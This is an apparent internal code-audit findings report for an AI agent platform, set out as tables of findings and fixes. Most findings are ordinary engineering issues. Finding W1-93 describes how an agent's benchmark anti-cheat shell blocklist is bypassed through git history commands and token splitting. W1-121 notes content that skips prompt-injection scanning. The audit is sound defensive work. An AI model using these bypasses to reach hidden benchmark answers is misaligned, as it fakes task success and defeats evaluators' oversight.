### tools/messaging (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-115 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/email_tool.py:80` | email.send, discord_bot post/reply/react, anki add_note and calendar create_event fire immediately with no confirm=true dry-run gate in standard mode | Add the standard `if not as_bool(args.get('confirm')): return 'DRY RUN: would send ... Re-run with confirm=true.'` to email send, discord post/reply/react, anki add_note and calendar create_event; add `confirm` to their schemas and extend tests/test_confirm_gate_fails_closed.py to cover them. | S |

### tools/registry (3)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-122 | medium | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/tools/__init__.py:1190` | 225 tools (~47k tokens of JSON schema) ride every model turn by default because only SaaS connectors are marked deferrable; ~150 of them are pure offline calculators | Mark every parallel_safe offline calculator (and the opt-in hardware/media tools) deferrable via `_defer`, or introduce a `Tool.deferrable` flag defaulting True for tools not in CORE_TOOL_NAMES; keep find_tools' lexical search as the discovery path. Add a test asserting the always-visible catalog stays under a token budget (e.g. 60 tools / 15k tokens). | M |
| W1-139 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/tools/__init__.py:1141` | base_registry is an ~800-line hand-ordered registration script with merge-artifact comments and env-gated blocks that must be kept in sync with three name sets by hand | Move to a table-driven registry: one `TOOL_SPECS` list of (factory, gate, deferrable, risk) entries consumed by base_registry, with a CI test asserting every entry has a risk class and that AMBIENT/AUTHENTICATED sets are derived from the table rather than duplicated. | M |
| W1-36 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/tools/__init__.py:1377` | Second rate-limit pass re-wraps every already-wrapped core/MCP tool despite the comment claiming double-wrapping is avoided | Mark wrapped fns (e.g. `fn.__maverick_rate_limited__ = True` or keep a set of wrapped names on the registry) and skip them on the second pass; route the replacement through a registry method that invalidates caches. | S |

### tools/registry+sandbox (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-116 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/__init__.py:706` | Workdir-bound tools (apply_patch, ast_edit, dep_graph, file_watcher, cross_repo_deps, diagram) are registered for every sandbox backend but operate on the host filesystem, so they fail on SSHBackend and diagram breaks on container backends | Gate apply_patch/ast_edit/dep_graph/file_watcher/cross_repo_deps behind the same `not SSHBackend` check (or teach them to use sandbox.exec for reads/writes), and make diagram_tool write its input inside sandbox.workdir (workspace-confined temp subdir) so container backends can see it; add a test that instantiates DockerBackend/SSHBackend stubs and asserts these tools either work or are not registered. | M |

### tools/sandbox_run (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-90 | medium | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/__init__.py:149` | sandbox_run feeds stdin through a base64 literal in argv — scripts over ~96 KB crash with 'Argument list too long' (code_exec, notebook_exec, wasm_run) | Write the stdin payload to a temp file inside workdir and pipe it (`base64 -d < file \| cmd`), or for host-visible backends pass input= directly; for remote backends chunk with a heredoc. Catch OSError in notebook_exec/wasm_run and return an ERROR string. Add a regression test with a 200 KB stdin. | S |

### tools/shell anti-cheat (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-93 | medium | Raised (finder cited evidence; skeptic pass not run); prior | security | `packages/maverick-core/maverick/tools/shell.py:102` | Opaque-benchmark shell blocklist is bypassed by git revert/checkout/reset/restore, .git/logs/HEAD via head/grep/python, split tokens and variable indirection | Implement the sandbox-layer control the comment describes: in opaque mode relocate .git out of workdir (or bind-mount it read-only/absent in container backends) and snapshot/restore the worktree so history-walking verbs cannot materialise the fix; at minimum add revert/checkout/reset/restore/switch/read-tree/cherry-pick/merge/rebase and `.git/logs` to the blocklist and document the residual risk in benchmark claims. | M |

### tools/untrusted-content (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-121 | medium | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/browser.py:473` | browser extract_html and connector-returned third-party content (discord history, email fetch, confluence page_get, dropbox download) skip the prompt-injection scan that extract_text/http_fetch apply | Route extract_html through _scan_fetched (strip hidden unicode, prepend the warning) and add a small `tools.untrusted_text(text)` helper that connectors returning remote user content call before returning; document which tools return untrusted content in their descriptions. | S |

### ARCHITECTURE (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-119 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `ARCHITECTURE.md:54` | ARCHITECTURE.md module inventory is years out of date (cli.py/skill_embeddings.py missing, 7 of 293 tools, 10 of 17 channels, wrong installer path) | Regenerate the Components tables from the tree (or cut them to links into docs/FEATURES.md and docs/architecture.md), fix CLAUDE.md:12 to `maverick/cli/`, and drop the non-existent skill_embeddings row. | S |

### README (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-125 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `README.md:174` | README Repository layout omits two of the eight packages (maverick-evolve, maverick-knowledge) and 14 of 17 deploy/ directories | Add the two packages and a one-line deploy/ index (or link deploy/README) and drop the counts that are stated elsewhere. | S |

### apps/installer-cli (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-59 | low | Raised (finder cited evidence; skeptic pass not run) | security | `apps/installer-cli/maverick_installer/wizard.py:8128` | Installer writes wizard-partial.json and validation-cache.json with write_text() then chmod (world-readable window) — the same TOCTOU it already fixed for .env | Route both writers through _write_wizard_file (or maverick.file_lock.atomic_write_text with mode=0o600). | S |

### ci/audit (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-10 | low | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `.github/workflows/ci.yml:303` | OSV cross-ecosystem scan omits four tracked lockfiles and the docs toolchain | Add the missing lockfiles to the `--lockfile` list (or switch to `osv-scanner scan source -r .` with the toml config and explicit excludes), and add a small test in test_release_packaging.py asserting every tracked lockfile is in the list so new ones cannot be forgotten. | S |
| W5-17 | low | Raised (finder cited evidence; skeptic pass not run) | ops | `osv-scanner.toml:8` | All 17 OSV vulnerability exceptions expire on the same day (2026-10-31) and will hard-fail the required `audit` check with no advance warning | Add a weekly scheduled step (e.g. in compliance-posture.yml) that parses osv-scanner.toml and warns/opens an issue when any ignoreUntil is within 30 days, and stagger or group the dates by root cause (GTK3 bindings vs unic crate) so a single expiry does not block all merges. | S |

### ci/concurrency (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-24 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `.github/workflows/ci.yml:21` | CI concurrency cancels the previous push-to-main run, so a red main commit can be cancelled (not failed) by the next merge | Use `cancel-in-progress: ${{ github.event_name == 'pull_request' }}` (as go-model-proxy.yml already does with `github.ref != 'refs/heads/main'`) so main runs queue instead of cancelling. | S |

### ci/efficiency (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-23 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `.github/workflows/mcp-clients.yml:68` | Dashboard JS DOM tests run twice per push (ui-regressions and mcp-clients), and `npm audit --audit-level=low` makes the TypeScript client job fail on any advisory | Delete the dashboard steps from mcp-clients.yml, and either drop `npm audit` in favour of the OSV scan or raise it to `--audit-level=high` with an `audit-ci` allowlist file. | S |

### ci/pinning (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-25 | low | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `.github/workflows/native.yml:56` | Third-party actions are SHA-pinned but Dependabot's version comments are missing on two, weakening review of bumps | Add `# <tag or date>` comments to the dtolnay/rust-toolchain pins (it publishes stable/`1.x` moving tags, so pin to the commit and note the date), and enable actionlint's `pin` check in CI to require both SHA and comment. | S |

### ci/sast (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-18 | low | Raised (finder cited evidence; skeptic pass not run) | security | `.github/workflows/ci.yml:441` | Bandit SAST gate runs at high severity only, leaving medium-severity classes (B608 SQL injection, B108 temp files, B310 URL open) unenforced | Run `bandit -ll -ii` once, annotate genuine false positives with `# nosec B608` + justification, and flip the gate to `-ll`; alternatively add a non-blocking `-ll` report job now and ratchet a baseline (bandit `-b baseline.json`) so new medium findings fail. | M |

### ci/sharding (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-73 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `conftest.py:64` | Every shard leg collects the whole 26k-test suite in every xdist worker before deselecting two thirds of it | Compute the file slice in a small script (`python -m maverick.test_shard 2/3 > files.txt`, same round-robin rule) and pass the file list on the pytest command line so collection is one third the size; keep the hook for local use. | S |

### cli/calibrate (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-54 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/cli/__init__.py:2755` | `calibrate --sample` silently clamps out-of-range confidence and records any unrecognised CORRECT token as 'incorrect', poisoning the safety-interlock dataset | Validate `0.0 <= conf <= 1.0` and CORRECT in an explicit true/false vocabulary; raise click.BadParameter otherwise (click.FloatRange(0,1) + click.Choice for the second token). | S |

### cli/config (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-55 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/cli/__init__.py:2479` | `maverick config` (show) prints config.toml verbatim with no secret redaction, while `support` redacts the same file | Redact values under secret-named keys by default (reuse support_bundle._redact on the parsed TOML, or regex on the raw text) and add `--reveal` for the raw file. | S |

### cli/consistency (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-66 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/cli/__init__.py:5880` | Machine-readable output flag is `--json` on 55 commands but `--format text\|json` on 16 others | Introduce one shared `output_format_option` decorator that registers both spellings (`--json` as an alias for `--format json`) and use it everywhere; document the convention in docs/handbook.md. | S |
| W3-67 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/_trust_groups.py:288` | Destructive commands use four different confirmation idioms (`--yes`, `--confirm`, `--apply`, none) | Standardise on `--yes` (accept `--confirm` as an alias on client erase), and add a TTY confirm to the irreversible no-flag deletions (fleet rm, trust rm, skill remove, cache purge). | S |

### cli/exit-codes (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-52 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/__init__.py:3899` | Inconsistent exit codes for the same error class: 'not found' is 1 in some commands and 2 in others, and `start` reuses click's usage-error code 2 for a blocked run | Adopt and document one table (0 ok, 1 runtime failure/not found, 2 usage, 3 refused/halted, 4 blocked-awaiting-input) and align the ~10 divergent sites; add a test over CliRunner asserting the table. | M |

### cli/export (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-63 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/cli/__init__.py:7098` | `export <goal>` writes the trajectory bundle with default umask permissions while `export-user` deliberately creates its file 0600 | Use file_lock.atomic_write_text(path, text, mode=0o600) as `support` does. | S |

### cli/help (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-53 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/cli/__init__.py:3700` | 65 options across 34 commands — including the flagship `start`, `chat`, `dashboard`, `serve`, `resume` — have no help text; 4 subcommands have no docstring | Add help= (with show_default=True) to every option; add a unit test that walks the click tree and fails on any Option without help or Command without a docstring (the walker in the audit scratch dir does this in ~20 lines). | S |

### cli/schedule (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-62 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/__init__.py:4518` | `schedule add`/`schedule goal` print 'next run' in naive local time with no zone label while `ps` prints UTC-labelled times | Render both with the same helper (UTC + explicit 'UTC' suffix, or local with %Z) and state the zone cron expressions are evaluated in, in the `schedule add` help. | S |

### cli/start (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-65 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/cli/__init__.py:3751` | `start --template X` reports a provider-key error before validating the template, so an offline user debugging a template name is sent to `maverick init` | Move template loading / param parsing / 'pass TITLE or --template' above _require_llm_key() (they are cheap and offline). | S |

### cli/status+history (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-58 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/cli/__init__.py:4655` | `history` and `status` load every goal row into Python and slice, while `ps` already uses the paginated `list_goals(limit=, order=)` API | Use `list_goals(limit=limit, order="desc")` and reverse for display in both commands. | S |

### core/a11y_audit (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-76 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/maverick/a11y_audit.py:8` | The static a11y CI gate is structurally blind to most of the dashboard UI (JS-rendered DOM, cross-template heading order, contrast, dialogs), so a green run over-claims | Add a rendered-page layer: the existing test_ui_a11y_dark_mode.py pattern (TestClient + parse rendered HTML) can run the same _A11yParser over the real rendered pages for heading order and duplicate ids; add a th/scope check for tables (test_no_bare_table_headers exists for some paths — extend it to the three above). For JS-rendered UI, run the tests/js node suite's DOM fixtures through the parser, or add an optional axe/pa11y job in CI (the a11y tool already wraps pa11y). Document the gate's scope in its docstring so a green run is not cited as full WCAG coverage. | M |

### core/ai_act (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-38 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/ai_act.py:58` | ai_act._safe swallows BaseException (KeyboardInterrupt/SystemExit) on the posture probe | Catch Exception (not BaseException), log at warning with exc_info, and surface a distinct 'probe_error' marker in the report so 'unknown' is not rendered as 'NOT MET'. | S |

### core/ai_act_package (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-39 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/maverick/ai_act_package.py:32` | ai_act_package._safe still swallows every exception silently (unresolved prior finding) | Narrow the catch, log with exc_info, and emit an explicit 'probe_error' section in the rendered markdown listing which evidence sources failed. | S |

### core/ai_dynamic_risk, ai_policy_management, ai_vendor_portal, ai_* (pattern) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-40 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/ai_dynamic_risk.py:717` | List-all-then-filter over governed record namespaces at 36 call sites: scoring one asset loads up to 10,000 signal records, an unauthenticated vendor token scans up to 5,000 invitations | Derive record ids from the lookup key where possible (e.g. invitation id = prefix + sha256(token) so the portal does a single get; per-asset signal ids or a per-asset index document for dynamic risk), or add a small secondary-index facility to GovernedRecordStore (namespace/field -> ids) maintained on create/update; cache validated policy authority keyed by policy revision digests. | M |

### core/ai_evidence_ledger and large ai_* modules (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-37 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/maverick/ai_evidence_ledger.py:1` | The 2,514-line signed receipt ledger has no test file of its own; several multi-thousand-line governance modules have 5-19 tests total | Add test_ai_evidence_ledger.py covering append/rollover, index rebuild from a truncated or diverged segment, cursor stability under concurrent append, read-only verification, and an append-cost regression; raise coverage of the crash/CAS paths in the other listed modules. | M |

### core/ai_evidence_local_parsers (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-88 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/ai_evidence_local_parsers.py:760` | preexec_fn used to set rlimits from a multi-threaded server process (documented CPython deadlock hazard) | Apply the memory limit without a fork hook: launch through a tiny wrapper (`python -c 'import resource,os,sys; resource.setrlimit(...); os.execvp(...)'`) or `prlimit --as=<bytes> -- <cmd>` where available, and enable PLW1509. | S |

### core/ai_identity_governance_provider_wire, ai_discovery_* (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-35 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/ai_identity_governance_provider_wire.py:1` | Three governance modules are reachable only from tests: ai_identity_governance_provider_wire (912 LOC), ai_discovery_identity_adapters (538), ai_discovery_sensor_test_estate (332) | Move ai_discovery_sensor_test_estate to tests/ (or a tools/ harness), and either wire provider_wire/identity_adapters into the identity-governance runtime behind the existing [ai_identity_governance_connectors] knobs or relocate them to an experimental package; record the decision in the reachability lock. | S |

### core/ai_inventory (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-42 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/ai_inventory.py:3821` | ai_inventory swallows failures while recording a failed discovery run, leaving connector status stale with no log | Log the secondary failure with exc_info and surface it in the raised DiscoverySyncError message (e.g. 'status update also failed: <type>'); consider marking the status 'unknown' in memory for the scheduler. | S |

### core/air_gap vs sandbox defaults (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-99 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/air_gap.py:129` | air_gap audit still reports 'backend=devcontainer defaults to network access' although the devcontainer default is now allow_network=False | Treat an unset allow_network for devcontainer like docker/podman/gvisor (return []); update the message and the test in test_air_gap*.py. | S |

### core/assessment_exports (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-75 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/assessment_exports.py:30` | assessment_exports.AssessmentExportError is never raised; loaders raise KeyError instead | Raise AssessmentExportError (subclassing KeyError/LookupError if compatibility matters) from _record_or_raise and wrap AssessmentStateError; or delete the unused class. | S |

### core/attestation_verify (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-76 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/attestation_verify.py:38` | Attestation verifier commits to the anchor ledger digest but never checks it, while FEATURES.md lists the anchor ledger among the re-derivable 'intact and complete' evidence | In _reread_evidence, when commitments.anchors.present, hash evidence_root/<name> and add a finding on mismatch (and optionally re-verify anchor rows against committed day tips); then FEATURES.md becomes accurate. Otherwise reword FEATURES.md to say the anchor ledger digest is committed but not re-checked. | S |

### core/audit signing + crypto_at_rest (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-64 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/audit/signing.py:481` | Stale/incorrect crypto docstrings: KMS-wrapped audit key documented under [encryption.kms] but read from [kms]; rotate_audit_keypair describes mtime selection; KEK decode error names the wrong env var | Fix the three strings; have _decode_injected_key take the env-var name for its message. | S |

### core/breach_notification (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-67 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/breach_notification.py:363` | breach_notification lists Quebec Law 25 as BOTH a verified regime (ca_quebec) and an unverified/absent one (qc_law25) | Delete the qc_law25 entry from UNVERIFIED_REGIMES (or make it an alias resolving to ca_quebec) and add a test asserting UNVERIFIED_REGIMES and REGIMES never describe the same jurisdiction. | S |

### core/budget + orchestrator (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-83 | low | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/budget.py:832` | When in-flight reservations exhaust the tenant allowance the run is admitted with max_dollars=0 and dies on its first LLM call instead of a clean over-quota refusal | Have tenant_over_quota subtract _outstanding_reservations (i.e. use tenant_remaining_today() <= 0) so the gate refuses before goal creation, and treat granted == 0 in _clamp_to_tenant_remainder as an explicit refusal reason. | S |

### core/cache llm (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-20 | low | Raised (finder cited evidence; skeptic pass not run); prior | dead-code | `packages/maverick-core/maverick/cache/llm.py:13` | Opt-in LLM response cache (cache/llm.py) is wired nowhere: zero callers of cache_key/lookup/store outside its own package | Either wire it into LLM.complete/complete_async behind the env switch (key on provider+model+system+messages+tools+max_tokens; skip when budget-bearing usage matters or thinking is on) with a test, or delete the module and its erasure hook and remove MAVERICK_LLM_CACHE from docs. | S |

### core/catalog (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-109 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/catalog.py:72` | Catalog/templates/MCP-registry silently contact raw.githubusercontent.com by default with no offline knob, and this default egress is not listed in the air-gap or telemetry docs | Add an offline/disable knob honoured by _index_urls() (and make air_gap flag a non-empty index list), and add a docs/NETWORK_EGRESS.md inventory table (host, trigger, opt-in knob, guarded-by) generated from the census plus the literal list above; surface it in `maverick doctor`. | S |

### core/cli (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-61 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/cli/__init__.py:2857` | `maverick dashboard --token` places the bearer token on the process command line (visible to all local users via ps/proc) | Deprecate --token in favour of --token-file / a hidden prompt (click.prompt hide_input) and the env var; keep --token with a warning for one release. | S |

### core/consent_* (all 22) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-21 | low | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-core/maverick/consent_native_sdk.py:517` | Nineteen divergent copies of the same private helpers across consent_* modules (canonical JSON, timestamps, origin parsing, choice normalisation) and split SQLite journal policy | Introduce maverick/consent_common.py with canonical(), sha256(), timestamp(), opaque_ref(), origin() and the SQLite _connect/_initialize scaffold (single journal policy), parameterised by an error class; migrate modules incrementally; add a CI check that consent_* modules import these rather than redefine them. | M |

### core/consent_custom_index + consent_profile_data + consent_analytics (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-16 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/consent_custom_index.py:251` | Bare sqlite3 connections used as context managers are never closed (custom_index, profile_data, analytics) — handle leak and WAL checkpoint starvation | Convert both _connect methods to contextlib.contextmanager with connection.close() in finally (copy the pattern from consent_preferences), or use contextlib.closing at each call site. | S |

### core/consent_delivery_destinations (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-22 | low | Raised (finder cited evidence; skeptic pass not run) | dead-code | `packages/maverick-core/maverick/consent_delivery_destinations.py:90` | Dead operation state 'rejected' in destination operation store is never assigned | Either transition non-retryable 4xx (400/401/403/404/422) to 'rejected' as the name implies, or remove the state from _OPERATION_STATES and the revoke exclusion list. | S |

### core/consent_preferences + dashboard (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-11 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/consent_preferences.py:752` | ConsentPreferenceStore runs a BEGIN IMMEDIATE backfill scan on every construction, and the dashboard constructs it per request under journal_mode=DELETE | Run the backfill once (schema_version bump / meta flag) instead of on every construction; cache one store per tenant in the dashboard (as consent_application_scanner_composition does); consider WAL like consent_experiments/profile_data. | S |

### core/consent_profile_data (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-25 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/consent_profile_data.py:1531` | value_history / consumer_view / export_profile return unbounded receipt history per profile | Page value_history (limit, after_sequence) and mark exports 'history_truncated' with a cursor, consistent with ConsentPreferenceStore.export_profile. | S |

### core/consent_scan_inventory (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-26 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/consent_scan_inventory.py:1376` | enqueue_due can be poisoned by a schedule whose next_due_at collides with an existing job (UNIQUE tenant,schedule_id,scheduled_for) | Use INSERT OR IGNORE / catch sqlite3.IntegrityError per schedule and advance next_due_at anyway (audit 'job.duplicate_skipped'), or validate in put_schedule that no job exists at the requested scheduled_for. | S |

### core/data_use_provider_adapters (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-57 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/data_use_provider_adapters.py:2772` | Provider adapters only attach pre-enrolled policies by name; mask/row-filter IR semantics never reach Snowflake/Databricks | Document the enrolment-binding model explicitly in FEATURES.md, and add a reconcile check that reads the native policy definition (SHOW MASKING POLICIES / DESCRIBE FUNCTION, GET_DDL) and compares a normalised body hash against a hash pinned at enrolment; surface drift as an ambiguity outcome in the audit plane. | M |

### core/enterprise (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-103 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/enterprise.py:379` | Enterprise egress lock treats every 169.254.0.0/16 address except two IMDS literals as 'local', so the ECS task-credentials endpoint 169.254.170.2 is permitted to unpinned httpx connectors | Add 169.254.170.2 (and the 169.254.169.0/24 + 169.254.170.0/24 ranges) to the non-local set, or invert the rule: treat link-local as NOT local unless explicitly allow-listed. | S |
| W2-104 | improvement | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/enterprise.py:533` | [enterprise] allowed_hosts is exact-match only: no wildcards, ports, schemes or per-tool scoping, forcing operators to enumerate every SaaS subdomain | Reuse sandbox.network_policy._matches (fnmatch + IDNA canonicalisation) in egress_permitted, support optional ':port', and add an [enterprise.allowed_hosts_by_tool] table; surface the effective allow-list in `maverick doctor` and reject patterns like '*' with a warning. | S |

### core/flow approvals (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-62 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/flow/approvals.py:79` | Flow approval links embed the full approval prompt text and a week-long HMAC token in the URL query string | Carry only an opaque reference (run_id+cursor hash) in the link and look the prompt up server-side; shorten default TTL; mark the /flow/approve GET no-store and strip the token from logs. | S |

### core/governance-suite stores (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-100 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/trc_continuous_evidence.py:497` | SQLite durability/pragma configuration drifts across the ten governed stores | Fold connection setup into the shared helper from the duplication finding with one pragma set (WAL, synchronous=FULL, foreign_keys=ON, secure_delete=ON, busy_timeout) and a test that asserts the pragmas on every store. | S |

### core/grc-suite (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-78 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/maverick/governance_agents.py:2144` | Seventeen governance functions exceed 150 lines (up to 287) with eight C901 waivers in scope | Split the four largest into validate/decide/persist stages (submit_run, verify_integrity, _verify_promotion_authorization, verify_erasure) with unit tests per stage; treat the C901 count in this suite as a ratchet. | M |

### core/grc_sync (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-77 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/grc_sync.py:553` | GRC sync status counts are silently capped at 500 outbound records | Count via iter_record_ids/pagination over the whole store (or maintain counters), and expose 'truncated: true' if a cap must remain. | S |
| W4-79 | improvement | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-core/maverick/grc_sync.py:257` | GRC sync backlink points every ServiceNow/Archer record at the assurance landing page instead of the source record | Build the backlink from kind + source_id (finding/incident/acceptance routes already exist in model_risk_api/security_api) and cover it in the existing outbound_payload test. | S |

